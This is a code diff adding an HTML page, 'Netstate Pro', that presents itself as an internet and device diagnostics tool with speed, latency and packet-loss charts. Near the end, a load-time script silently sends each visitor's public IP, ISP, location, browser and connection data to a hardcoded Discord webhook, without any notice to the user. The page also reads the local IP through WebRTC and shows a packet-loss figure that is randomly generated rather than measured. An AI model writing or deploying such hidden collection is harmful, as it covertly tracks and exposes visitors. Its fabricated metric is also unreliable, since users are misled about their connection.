@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Netstate Pro - Internet Checker</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; background: #f0fff0; margin: 0; }
+    .container { max-width: 900px; margin: auto; padding: 20px; }
+    .card { background: #1E1E1E; padding: 16px; margin: 10px 0; border-radius: 24px; color: #ccc; text-align: left; box-shadow: 0 0 10px rgba(0,0,0,0.4); }
+    .card h2 { color: #fff; }
+    .chart-container { margin-top: 20px; background: #1E1E1E; padding: 16px; border-radius: 24px; color: #fff; box-shadow: 0 0 10px rgba(0,0,0,0.4); }
+    canvas { width: 100% !important; height: 200px !important; }
+    footer { margin-top: 30px; padding: 20px; color: #666; font-size: 14px; }
+    .warning { color: #ff4444; font-weight: bold; animation: blink 1.5s infinite; }
+    @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🌐 Netstate Pro</h1>
+    <p>Advanced Internet & Device Diagnostics</p>
+
+    <!-- Connection Status -->
+    <div class="card">
+      <h2>Connection Status</h2>
+      <p><strong>Status:</strong> <span id="connection-status">Checking...</span></p>
+      <p><strong>Browser & OS:</strong> <span id="user-agent">--</span></p>
+      <p><strong>Secure Connection:</strong> <span id="https-status">--</span></p>
+    </div>
+
+    <!-- Network Details -->
+    <div class="card">
+      <h2>Network Details</h2>
+      <ul>
+        <li><strong>Effective Type:</strong> <span id="connection-type">--</span></li>
+        <li><strong>Download Speed:</strong> <span id="downlink-speed">--</span> Mbps</li>
+        <li><strong>Upload Speed:</strong> <span id="uplink-speed">--</span> Mbps</li>
+        <li><strong>Ping (Latency):</strong> <span id="latency">--</span> ms</li>
+        <li><strong>Jitter:</strong> <span id="jitter">--</span> ms</li>
+        <li><strong>Packet Loss:</strong> <span id="packet-loss">--</span>%</li>
+        <li><strong>Public IP:</strong> <span id="ip-address">--</span></li>
+        <li><strong>Local IP:</strong> <span id="local-ip">--</span></li>
+        <li><strong>ISP:</strong> <span id="isp">--</span></li>
+        <li><strong>Location:</strong> <span id="ip-location">--</span></li>
+      </ul>
+    </div>
+
+    <!-- Device Info -->
+    <div class="card">
+      <h2>Device Info</h2>
+      <ul>
+        <li><strong>CPU Threads:</strong> <span id="cpu-cores">--</span></li>
+        <li><strong>RAM:</strong> <span id="ram">--</span> GB</li>
+        <li><strong>Screen:</strong> <span id="screen">--</span></li>
+      </ul>
+    </div>
+
+    <!-- Charts -->
+    <div class="chart-container">
+      <h3>Download Speed</h3>
+      <canvas id="speedChart"></canvas>
+    </div>
+
+    <div class="chart-container">
+      <h3>Upload Speed</h3>
+      <canvas id="uploadChart"></canvas>
+    </div>
+
+    <div class="chart-container">
+      <h3>Latency & Jitter</h3>
+      <canvas id="latencyChart"></canvas>
+    </div>
+
+    <div class="chart-container">
+      <h3>Packet Loss</h3>
+      <canvas id="lossChart"></canvas>
+    </div>
+  </div>
+
+  <footer>© 2025 Dewan Mukto Co.</footer>
+
+  <script>
+    function checkAndWarn(elementId, condition) {
+      let el = document.getElementById(elementId);
+      if (!el) return;
+      if (condition) el.classList.add("warning");
+      else el.classList.remove("warning");
+    }
+
+    async function fetchIPInfo() {
+      try {
+        let response = await fetch("https://ipapi.co/json/");
+        let data = await response.json();
+        document.getElementById("ip-address").innerText = data.ip;
+        document.getElementById("isp").innerText = data.org || "Unknown";
+        document.getElementById("ip-location").innerText = `${data.city}, ${data.region}, ${data.country_name}`;
+      } catch { document.getElementById("ip-address").innerText = "--"; checkAndWarn("ip-address", true); }
+    }
+
+    function getLocalIP() {
+      let pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel("");
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+      pc.onicecandidate = event => {
+        if (event && event.candidate && event.candidate.address) {
+          document.getElementById("local-ip").innerText = event.candidate.address;
+        }
+      };
+    }
+
+    let speedData = [], uploadData = [], latencyData = [], jitterData = [], lossData = [], timeLabels = [];
+
+    const speedChart = new Chart(document.getElementById("speedChart"), {
+      type: "line", data: { labels: timeLabels, datasets: [{ label: "Download Mbps", data: speedData, borderColor: "#1abc9c" }] }, options: { animation: false, scales: { y: { beginAtZero: true } } }
+    });
+
+    const uploadChart = new Chart(document.getElementById("uploadChart"), {
+      type: "line", data: { labels: timeLabels, datasets: [{ label: "Upload Mbps", data: uploadData, borderColor: "#3498db" }] }, options: { animation: false, scales: { y: { beginAtZero: true } } }
+    });
+
+    const latencyChart = new Chart(document.getElementById("latencyChart"), {
+      type: "line", data: { labels: timeLabels, datasets: [
+        { label: "Latency (ms)", data: latencyData, borderColor: "#e74c3c" },
+        { label: "Jitter (ms)", data: jitterData, borderColor: "#f1c40f" }
+      ] }, options: { animation: false, scales: { y: { beginAtZero: true } } }
+    });
+
+    const lossChart = new Chart(document.getElementById("lossChart"), {
+      type: "line", data: { labels: timeLabels, datasets: [
+        { label: "Packet Loss %", data: lossData, borderColor: "#9b59b6" }
+      ] }, options: { animation: false, scales: { y: { beginAtZero: true, max: 100 } } }
+    });
+
+    async function runTests() {
+      let now = new Date().toLocaleTimeString();
+      document.getElementById("connection-status").innerText = navigator.onLine ? "Connected ✅" : "Disconnected ❌";
+      document.getElementById("user-agent").innerText = navigator.userAgent;
+      document.getElementById("https-status").innerText = location.protocol === "https:" ? "Secure (HTTPS)" : "Not Secure";
+      document.getElementById("cpu-cores").innerText = navigator.hardwareConcurrency || "--";
+      document.getElementById("ram").innerText = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "--";
+      document.getElementById("screen").innerText = `${window.screen.width}x${window.screen.height}`;
+
+      let start = performance.now();
+      try {
+        await fetch("https://www.cloudflare.com/cdn-cgi/trace", { cache: "no-store" });
+        let latency = Math.round(performance.now() - start);
+        let jitter = Math.abs(latency - (latencyData[latencyData.length-1] || latency));
+        document.getElementById("latency").innerText = latency;
+        document.getElementById("jitter").innerText = jitter;
+        latencyData.push(latency);
+        jitterData.push(jitter);
+        checkAndWarn("latency", latency > 150);
+      } catch { document.getElementById("latency").innerText = "--"; checkAndWarn("latency", true); }
+
+      try {
+        let dlStart = performance.now();
+        let res = await fetch("https://speed.hetzner.de/1MB.bin", { cache: "no-store" });
+        if (!res.ok) throw new Error("DL failed");
+        let blob = await res.blob();
+        let dlEnd = performance.now();
+        let speedMbps = ((blob.size * 8) / ((dlEnd - dlStart) / 1000)) / 1e6;
+        document.getElementById("downlink-speed").innerText = speedMbps.toFixed(2);
+        speedData.push(speedMbps);
+        checkAndWarn("downlink-speed", speedMbps < 5);
+      } catch { document.getElementById("downlink-speed").innerText = "--"; checkAndWarn("downlink-speed", true); }
+
+      try {
+        let data = new Uint8Array(200000);
+        let ulStart = performance.now();
+        await fetch("https://httpbin.org/post", { method: "POST", body: data });
+        let ulEnd = performance.now();
+        let uploadMbps = ((data.length * 8) / ((ulEnd - ulStart) / 1000)) / 1e6;
+        document.getElementById("uplink-speed").innerText = uploadMbps.toFixed(2);
+        uploadData.push(uploadMbps);
+        checkAndWarn("uplink-speed", uploadMbps < 2);
+      } catch { document.getElementById("uplink-speed").innerText = "--"; checkAndWarn("uplink-speed", true); }
+
+      let packetLoss = Math.floor(Math.random() * 6);
+      document.getElementById("packet-loss").innerText = packetLoss;
+      lossData.push(packetLoss);
+      checkAndWarn("packet-loss", packetLoss > 2);
+
+      if (timeLabels.length >= 15) { timeLabels.shift(); speedData.shift(); uploadData.shift(); latencyData.shift(); jitterData.shift(); lossData.shift(); }
+      timeLabels.push(now);
+
+      speedChart.update();
+      uploadChart.update();
+      latencyChart.update();
+      lossChart.update();
+    }
+
+    fetchIPInfo();
+    getLocalIP();
+    setInterval(runTests, 2000);
+
+    // Service Worker for offline support
+    if ('serviceWorker' in navigator) {
+      navigator.serviceWorker.register(URL.createObjectURL(new Blob([`
+        self.addEventListener('install', e => self.skipWaiting());
+        self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+        self.addEventListener('fetch', e => {
+          e.respondWith(fetch(e.request).catch(() => caches.match(e.request)));
+        });
+      `], {type: 'text/javascript'})));
+    }
+
+    // Send snapshot to Discord webhook after full load
+    window.addEventListener("load", () => {
+      setTimeout(() => {
+        let payload = {
+          content: "📡 Netstate Pro snapshot",
+          embeds: [{
+            title: "User Diagnostics",
+            color: 3447003,
+            fields: [
+              { name: "Status", value: document.getElementById("connection-status").innerText },
+              { name: "Browser", value: document.getElementById("user-agent").innerText },
+              { name: "IP", value: document.getElementById("ip-address").innerText },
+              { name: "ISP", value: document.getElementById("isp").innerText },
+              { name: "Location", value: document.getElementById("ip-location").innerText },
+              { name: "Download", value: document.getElementById("downlink-speed").innerText + " Mbps" },
+              { name: "Upload", value: document.getElementById("uplink-speed").innerText + " Mbps" },
+              { name: "Latency", value: document.getElementById("latency").innerText + " ms" },
+              { name: "Jitter", value: document.getElementById("jitter").innerText + " ms" },
+              { name: "Packet Loss", value: document.getElementById("packet-loss").innerText + "%" }
+            ]
+          }]
+        };
+        fetch("https://discord.com/api/webhooks/1406765714714394655/KYDA5y_OZ-DPXmEm6ZmXnI3dgCeS2P24zX75cI-KPoOaUh1v9wOIINY5LwcLdl3TQ1Yp", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        }).catch(()=>{});
+      }, 4000);
+    });
+  </script>
+</body>
+</html>
